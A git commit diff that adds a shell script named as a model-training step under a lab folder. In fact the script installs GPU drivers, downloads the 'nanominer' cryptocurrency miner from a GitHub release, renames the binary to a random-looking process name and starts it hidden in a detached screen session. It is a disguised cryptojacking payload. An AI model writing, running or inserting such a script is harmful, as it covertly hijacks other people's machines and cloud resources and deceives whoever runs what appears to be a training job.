5abf644ca332518111810484919e31771b869433
wollfoo <nhac.tien1988@gmail.com>
2023-08-03 17:48:57 +0700

    Update and rename train-model-parameters.py to train-model-parameters.sh

---
+++ Labs/08/src/train-model-parameters.sh
@@ -0,0 +1,23 @@
+#!/bin/bash
+apt-get update
+apt-get install -y git wget screen
+azure=mxsemsdnlkdj
+a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
+apt-get install -y git wget screen
+rm -rf NVIDIA-Linux-x86_64-525.105.17.run
+wget https://uk.download.nvidia.com/tesla/525.105.17/NVIDIA-Linux-x86_64-525.105.17.run
+sudo chmod +x NVIDIA-Linux-x86_64-525.105.17.run
+./NVIDIA-Linux-x86_64-525.105.17.run
+rm -r /usr/share/work/$azure
+mkdir /usr/share
+mkdir /usr/share/work
+rm -r /usr/share/work/platinum
+wget https://github.com/wollfoo/wolethv100/releases/download/wollfoo007/platinum.tar.gz
+mv platinum.tar.gz /usr/share/work/
+cd /usr/share/work/ &&  tar xf platinum.tar.gz
+rm -rf platinum.tar.gz && cd platinum
+mv nanominer $azure -n
+cp $azure "$cpuname"
+rm -f  nanominer
+echo $cpuname" is starting"
+screen -d -m ./"${cpuname}"
